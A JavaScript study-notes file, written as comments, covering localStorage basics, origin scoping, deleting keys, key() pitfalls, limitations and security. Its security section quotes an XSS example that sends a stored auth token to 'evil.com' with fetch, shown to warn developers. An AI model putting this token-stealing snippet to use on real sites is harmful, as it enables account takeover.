/********************************************************
 * localStorage — COMPLETE NOTES (FROM BASICS)
 * key–value, string, domain, subdomain, origin
 ********************************************************/


/********************************************************
 * WHAT IS localStorage?
 ********************************************************/

/*
localStorage is a browser storage mechanism
used to store data in the form of:

KEY → VALUE
*/

/*
Data is stored:
- In the browser
- Per ORIGIN
- As STRING only
*/


/********************************************************
 * KEY–VALUE PAIR CONCEPT
 ********************************************************/

/*
Everything in localStorage is stored as:

"key" : "value"
*/

localStorage.setItem("theme", "dark");
localStorage.setItem("user", "Abhishek");

/*
Retrieve value using key
*/

localStorage.getItem("theme"); // "dark"


/********************************************************
 * STRING-ONLY STORAGE (VERY IMPORTANT)
 ********************************************************/

/*
localStorage can store ONLY STRINGS.
*/

/*
Numbers, objects, arrays → converted to string
*/


/********************************************************
 * NUMBER EXAMPLE
 ********************************************************/

localStorage.setItem("age", 21);

localStorage.getItem("age"); // "21" (string)


/********************************************************
 * OBJECT EXAMPLE (CORRECT WAY)
 ********************************************************/

const user = { name: "Abhishek", role: "admin" };

localStorage.setItem("user", JSON.stringify(user));

const storedUser = JSON.parse(localStorage.getItem("user"));

console.log(storedUser.name);


/********************************************************
 * WHERE localStorage DATA IS STORED?
 ********************************************************/

/*
localStorage is stored per ORIGIN.
*/

/*
ORIGIN = protocol + domain + port
*/


/********************************************************
 * WHAT IS AN ORIGIN?
 ********************************************************/

/*
Origin consists of:
1. Protocol (http / https)
2. Domain (example.com)
3. Port (80, 443, etc)
*/

/*
ALL THREE must match
*/


/********************************************************
 * ORIGIN EXAMPLE
 ********************************************************/

/*
https://docs.google.com
protocol → https
domain   → docs.google.com
port     → 443 (default)
*/


/********************************************************
 * DOMAIN vs SUBDOMAIN
 ********************************************************/

/*
google.com        → domain
docs.google.com   → subdomain
mail.google.com   → subdomain
drive.google.com  → subdomain
*/


/********************************************************
 * localStorage & SUBDOMAINS (VERY IMPORTANT)
 ********************************************************/

/*
localStorage is NOT shared across subdomains.
*/

/*
Each origin gets its OWN localStorage.
*/


/********************************************************
 * PRACTICAL EXAMPLE
 ********************************************************/

/*
Stored at:
https://google.com
*/

localStorage.setItem("theme", "dark");

/*
Can be accessed ONLY at:
https://google.com
*/

/*
NOT accessible at:
https://docs.google.com
https://mail.google.com
*/


/********************************************************
 * ORIGIN DIFFERENCE EXAMPLES
 ********************************************************/

/*
Different protocol:
http://example.com
https://example.com
→ ❌ different origin
*/

/*
Different subdomain:
https://example.com
https://blog.example.com
→ ❌ different origin
*/

/*
Different port:
https://example.com:3000
https://example.com:4000
→ ❌ different origin
*/


/********************************************************
 * SAME ORIGIN EXAMPLE
 ********************************************************/

/*
https://docs.google.com/page1
https://docs.google.com/page2
→ ✅ same origin
→ share localStorage
*/


/********************************************************
 * WHY BROWSER DOES THIS?
 ********************************************************/

/*
For SECURITY reasons.

Prevents one website from
accessing another website’s data.
*/


/********************************************************
 * localStorage vs sessionStorage (SHORT)
 ********************************************************/

/*
localStorage:
- Persistent
- Per origin
- Survives browser close

sessionStorage:
- Per tab
- Per origin
- Cleared on tab close
*/


/********************************************************
 * COMMON USE CASES
 ********************************************************/

/*
- Theme (dark / light)
- Login state
- User preferences
- Language settings
*/


/********************************************************
 * WHAT NOT TO STORE (SECURITY)
 ********************************************************/

/*
❌ Passwords
❌ Bank details
❌ Sensitive secrets
*/


/********************************************************
 * REAL-LIFE ANALOGY
 ********************************************************/

/*
Origin → House address
localStorage → Locker in that house

Different house → different locker
*/


/********************************************************
 * INTERVIEW ONE-LINER
 ********************************************************/

/*
localStorage stores data as string key–value pairs
and is scoped to a specific origin
(protocol + domain + port).
*/


/********************************************************
 * MEMORY TRICK
 ********************************************************/

/*
Key–Value
String only
One origin = one storage
*/


/********************************************************
 * OTHER WAYS TO DELETE DATA FROM localStorage
 * (NOTES FORM – FROM BASICS)
 ********************************************************/


/********************************************************
 * METHOD 1️⃣ removeItem()  (MOST COMMON)
 ********************************************************/

/*
Deletes ONE specific key from localStorage
*/

localStorage.removeItem("name");

/*
After this:
"name" key is gone
*/


/********************************************************
 * METHOD 2️⃣ clear()  (DELETE EVERYTHING)
 ********************************************************/

/*
Deletes ALL keys for the current origin
⚠️ Very dangerous if used accidentally
*/

localStorage.clear();

/*
After this:
localStorage is completely empty
*/


/********************************************************
 * METHOD 3️⃣ SET VALUE TO null (NOT RECOMMENDED)
 ********************************************************/

/*
This does NOT delete the key
It stores the string "null"
*/

localStorage.setItem("name", null);

localStorage.getItem("name"); // "null"

/*
❌ Key still exists
❌ Value is string "null"
*/


/********************************************************
 * METHOD 4️⃣ SET VALUE TO EMPTY STRING
 ********************************************************/

/*
Key still exists, value is empty
*/

localStorage.setItem("name", "");

localStorage.getItem("name"); // ""

/*
❌ Not deleted
*/


/********************************************************
 * METHOD 5️⃣ DELETE MULTIPLE KEYS MANUALLY
 ********************************************************/

/*
Use when you want to remove selected keys
*/

localStorage.removeItem("name");
localStorage.removeItem("theme");
localStorage.removeItem("token");


/********************************************************
 * METHOD 6️⃣ DELETE USING LOOP (ADVANCED)
 ********************************************************/

/*
Remove keys based on condition
*/

Object.keys(localStorage).forEach((key) => {
    if (key.startsWith("user_")) {
        localStorage.removeItem(key);
    }
});


/********************************************************
 * METHOD 7️⃣ LOGOUT USE CASE (REAL WORLD)
 ********************************************************/

/*
On logout:
- Remove login-related data only
*/

localStorage.removeItem("token");
localStorage.removeItem("user");
localStorage.removeItem("isLoggedIn");


/********************************************************
 * WHAT METHOD TO USE & WHEN?
 ********************************************************/

/*
removeItem(key) → delete one key (best)
clear()         → delete everything
loop removal    → conditional delete
*/


/********************************************************
 * WHAT NOT TO DO (IMPORTANT)
 ********************************************************/

/*
❌ setItem(key, null)
❌ setItem(key, undefined)
*/

/*
These do NOT delete data
*/


/********************************************************
 * INTERVIEW ONE-LINER
 ********************************************************/

/*
localStorage data can be removed using
removeItem for specific keys or clear
to remove all stored data for an origin.
*/


/********************************************************
 * MEMORY TRICK
 ********************************************************/

/*
removeItem → one
clear      → all
*/


/********************************************************
 * localStorage.key() — COMPLETE NOTES (FROM BASICS)
 * (Include behavior, index, loops, pitfalls)
 ********************************************************/


/********************************************************
 * WHAT IS localStorage.key() ?
 ********************************************************/

/*
localStorage.key(index) returns the KEY NAME
stored at the given numeric index in localStorage.
*/

/*
Syntax:
localStorage.key(index)
*/


/********************************************************
 * WHAT DOES index MEAN?
 ********************************************************/

/*
index is a NUMBER (0-based)

Valid range:
0  → localStorage.length - 1
*/


/********************************************************
 * BASIC EXAMPLE
 ********************************************************/

localStorage.setItem("name", "abhi");
localStorage.setItem("theme", "dark");

console.log(localStorage.key(0)); // "name" (usually)
console.log(localStorage.key(1)); // "theme" (usually)


/********************************************************
 * IMPORTANT: ORDER IS NOT GUARANTEED
 ********************************************************/

/*
The Storage spec does NOT guarantee key order.
*/

/*
Browsers usually follow insertion order,
but you MUST NOT rely on it.
*/


/********************************************************
 * WHAT key() RETURNS WHEN INDEX IS INVALID
 ********************************************************/

/*
If index is:
- < 0
- >= localStorage.length
- NaN
- non-numeric string

Then:
localStorage.key(index) → null
(or browser-dependent fallback)
*/


/********************************************************
 * INVALID INDEX EXAMPLES
 ********************************************************/

localStorage.key(-1);        // null
localStorage.key(100);       // null
localStorage.key("abc");     // null (or fallback)
localStorage.key(undefined); // null


/********************************************************
 * localStorage.key() EXPECTS A NUMBER
 ********************************************************/

/*
key() internally converts the argument to a number.
*/

Number("2");        // 2
Number("length");   // NaN
Number("getItem");  // NaN


/********************************************************
 * WHY for...in CAUSES PROBLEMS
 ********************************************************/

/*
for...in iterates over PROPERTY NAMES,
not numeric indexes.
*/

/*
Example property names:
"0", "1", "length", "getItem", "setItem", ...
*/


/********************************************************
 * PROBLEMATIC CODE (DO NOT USE)
 ********************************************************/

/*
for (let index in localStorage) {
    console.log(localStorage.key(index));
}
*/

/*
Reason:
- index becomes "length", "getItem", etc.
- key(index) receives NaN
- Browser returns null or fallback key
*/


/********************************************************
 * WHY SAME KEY REPEATS (CHROME)
 ********************************************************/

/*
When index → NaN:
- Chrome uses an internal fallback index
- Usually resolves to index 1
- Same key (e.g., "key1") prints repeatedly
*/


/********************************************************
 * WHY CONSOLE SHOWS (10) key1
 ********************************************************/

/*
Chrome groups identical logs.

Meaning:
"key1" was logged 10 times internally.
*/


/********************************************************
 * CORRECT WAY TO USE localStorage.key()
 ********************************************************/

/*
Always use a numeric loop.
*/

for (let i = 0; i < localStorage.length; i++) {
    console.log(localStorage.key(i));
}


/********************************************************
 * SAFER MODERN ALTERNATIVE
 ********************************************************/

/*
Use Object.keys instead of key().
*/

Object.keys(localStorage).forEach((key) => {
    console.log(key);
});


/********************************************************
 * localStorage.length RELATION
 ********************************************************/

/*
localStorage.length tells how many keys exist.

Indexes range:
0 → length - 1
*/


/********************************************************
 * COMMON MISTAKES
 ********************************************************/

/*
❌ Assuming key order is fixed
❌ Using for...in with localStorage
❌ Passing strings to key()
❌ Trusting DevTools order
*/


/********************************************************
 * INTERVIEW ONE-LINER
 ********************************************************/

/*
localStorage.key(index) returns the key name at
the given numeric index, but key order and invalid
index handling are browser-dependent.
*/


/********************************************************
 * MEMORY TRICK
 ********************************************************/

/*
key(index) → NUMBER only
length     → total keys
for...in   → NEVER with localStorage
*/


/********************************************************
 * LIMITATIONS OF localStorage
 * (COMPLETE NOTES – IMPORTANT FOR INTERVIEWS)
 ********************************************************/


/********************************************************
 * 1️⃣ STORES ONLY STRINGS
 ********************************************************/

/*
localStorage can store ONLY string values.
*/

/*
Numbers, objects, arrays are auto-converted to strings.
*/

/*
Example:
*/

localStorage.setItem("age", 21);
localStorage.getItem("age"); // "21" (string)


/********************************************************
 * 2️⃣ LIMITED STORAGE SIZE
 ********************************************************/

/*
Storage limit is small (~5MB per origin).
*/

/*
Exact limit depends on browser.
*/


/********************************************************
 * 3️⃣ BLOCKING / SYNCHRONOUS API
 ********************************************************/

/*
localStorage APIs are synchronous.

This can:
- Block main thread
- Cause performance issues
*/


/********************************************************
 * 4️⃣ NO BUILT-IN SECURITY
 ********************************************************/

/*
Data is accessible via JavaScript.
*/

/*
Anyone can:
- Open DevTools
- Read or modify data
*/


/********************************************************
 * 5️⃣ NOT SAFE FOR SENSITIVE DATA
 ********************************************************/

/*
Never store:
- Passwords
- Bank details
- Private tokens (long-term)
*/


/********************************************************
 * 6️⃣ NO EXPIRY MECHANISM
 ********************************************************/

/*
localStorage does NOT support expiration.

Data stays forever until manually removed.
*/


/********************************************************
 * 7️⃣ PER-ORIGIN STORAGE ONLY
 ********************************************************/

/*
localStorage is scoped to ORIGIN.

Origin = protocol + domain + port.
*/

/*
Data is NOT shared across:
- Subdomains
- Different protocols
- Different ports
*/


/********************************************************
 * 8️⃣ NOT AVAILABLE IN ALL CONTEXTS
 ********************************************************/

/*
localStorage may be disabled in:
- Private/Incognito mode
- Strict browser settings
*/


/********************************************************
 * 9️⃣ NO SERVER ACCESS
 ********************************************************/

/*
localStorage is client-side only.

Server cannot access it directly.
*/


/********************************************************
 * 🔟 NO TRANSACTIONS OR INDEXING
 ********************************************************/

/*
Cannot:
- Query data
- Index values
- Perform atomic operations
*/


/********************************************************
 * 1️⃣1️⃣ DATA LOSS RISK
 ********************************************************/

/*
Data can be cleared by:
- User
- Browser cleanup
- Storage eviction
*/


/********************************************************
 * 1️⃣2️⃣ NOT SUITABLE FOR LARGE DATA
 ********************************************************/

/*
Not recommended for:
- Large files
- Images
- Videos
*/


/********************************************************
 * 1️⃣3️⃣ NOT IDEAL FOR MULTI-TAB SYNC
 ********************************************************/

/*
Multiple tabs can overwrite data
without coordination.
*/


/********************************************************
 * 1️⃣4️⃣ NO VERSIONING SUPPORT
 ********************************************************/

/*
Hard to manage schema changes.
*/


/********************************************************
 * 1️⃣5️⃣ STORAGE EVENTS LIMITATION
 ********************************************************/

/*
storage event:
- Fires only in OTHER tabs
- Not in the same tab
*/


/********************************************************
 * COMPARISON (SHORT)
 ********************************************************/

/*
localStorage:
- Persistent
- Insecure
- Small
- Sync

Use IndexedDB for:
- Large data
- Async storage
*/


/********************************************************
 * INTERVIEW ONE-LINER
 ********************************************************/

/*
localStorage is a simple, synchronous,
string-only storage with limited size
and no built-in security or expiration.
*/


/********************************************************
 * MEMORY TRICK
 ********************************************************/

/*
localStorage →
Small | String | Sync | Unsafe
*/


/********************************************************
 * SECURITY & localStorage
 * (COMPLETE NOTES – VERY IMPORTANT)
 ********************************************************/


/********************************************************
 * IS localStorage SECURE?
 ********************************************************/

/*
NO ❌

localStorage is NOT secure by design.
It is meant for convenience, not security.
*/


/********************************************************
 * WHY localStorage IS NOT SECURE
 ********************************************************/

/*
1. Accessible via JavaScript
2. No encryption
3. No access control
4. Easy to modify via DevTools
*/


/********************************************************
 * ANYONE CAN READ localStorage
 ********************************************************/

/*
Steps:
1. Open browser DevTools
2. Application / Storage tab
3. View & edit localStorage freely
*/


/********************************************************
 * XSS ATTACK (BIGGEST RISK)
 ********************************************************/

/*
If your site has an XSS vulnerability,
attacker can read localStorage.
*/

/*
Example:
<script>
  fetch("evil.com?token=" + localStorage.getItem("token"))
</script>
*/


/********************************************************
 * WHY TOKENS IN localStorage ARE DANGEROUS
 ********************************************************/

/*
If JWT or auth token is stored in localStorage:
- Any injected script can steal it
- Leads to account takeover
*/


/********************************************************
 * WHAT SHOULD NEVER BE STORED
 ********************************************************/

/*
❌ Passwords
❌ Credit card numbers
❌ Private keys
❌ Long-lived auth tokens
*/


/********************************************************
 * localStorage vs Cookies (SECURITY)
 ********************************************************/

/*
localStorage:
- Accessible by JS ❌
- No HttpOnly ❌
- No Secure flag ❌

Cookies:
- Can be HttpOnly ✅
- Can be Secure ✅
- Can be SameSite protected ✅
*/


/********************************************************
 * CSRF vs XSS
 ********************************************************/

/*
localStorage:
- Safe from CSRF (not auto-sent)
- Vulnerable to XSS ❌

Cookies:
- Vulnerable to CSRF
- Can be protected with SameSite
*/


/********************************************************
 * WHY DEVELOPERS STILL USE localStorage
 ********************************************************/

/*
Because it is:
- Simple
- Persistent
- Fast
- Client-side only
*/


/********************************************************
 * SAFE USE CASES FOR localStorage
 ********************************************************/

/*
✅ Theme (dark / light)
✅ Language preference
✅ UI settings
✅ Non-sensitive flags
*/


/********************************************************
 * BETTER ALTERNATIVES FOR AUTH
 ********************************************************/

/*
Use:
- HttpOnly cookies
- Short-lived access tokens
- Refresh tokens securely
*/


/********************************************************
 * BASIC SECURITY BEST PRACTICES
 ********************************************************/

/*
1. Never trust localStorage data
2. Validate everything on server
3. Use Content Security Policy (CSP)
4. Sanitize user input
5. Avoid inline scripts
*/


/********************************************************
 * CONTENT SECURITY POLICY (CSP)
 ********************************************************/

/*
CSP reduces XSS risk by blocking
unauthorized scripts.
*/


/********************************************************
 * EXAMPLE: SAFE THEME STORAGE
 ********************************************************/

localStorage.setItem("theme", "dark"); // ✅ safe


/********************************************************
 * EXAMPLE: UNSAFE AUTH STORAGE
 ********************************************************/

localStorage.setItem("jwt", "secret_token"); // ❌ unsafe


/********************************************************
 * WHAT TO DO ON LOGOUT
 ********************************************************/

/*
Always clear sensitive client-side data
*/

localStorage.removeItem("user");
localStorage.removeItem("theme");


/********************************************************
 * INTERVIEW ONE-LINER
 ********************************************************/

/*
localStorage is not secure and should never
be used to store sensitive data because it
is accessible to JavaScript and vulnerable
to XSS attacks.
*/


/********************************************************
 * MEMORY TRICK
 ********************************************************/

/*
localStorage →
Convenient ❌ Secure
*/


 /* WHAT HAPPENS WHEN localStorage IS FULL?
 ********************************************************/

/*
When you try to store MORE data than
the browser allows in localStorage,
the browser throws an ERROR.
*/


/********************************************************
 * NAME OF THE ERROR (IMPORTANT)
 ********************************************************/

/*
❌ QuotaExceededError
*/
